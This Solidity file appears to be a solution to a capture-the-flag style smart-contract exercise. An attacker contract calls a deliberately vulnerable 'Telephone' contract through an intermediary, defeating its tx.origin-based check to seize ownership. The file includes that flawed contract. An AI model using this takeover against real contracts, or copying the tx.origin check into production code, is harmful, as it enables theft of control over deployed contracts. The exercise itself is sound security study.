// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Hack {
    Telephone private telephone;

    constructor(address _target) {
        telephone = Telephone(_target);
    }

    function change() external {
        telephone.changeOwner(msg.sender);
    }

    // 或者可以写成下面的形式
    // constructor(address _target) {
    //     Telephone(_target).changeOwner(msg.sender);
    // }
}

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}
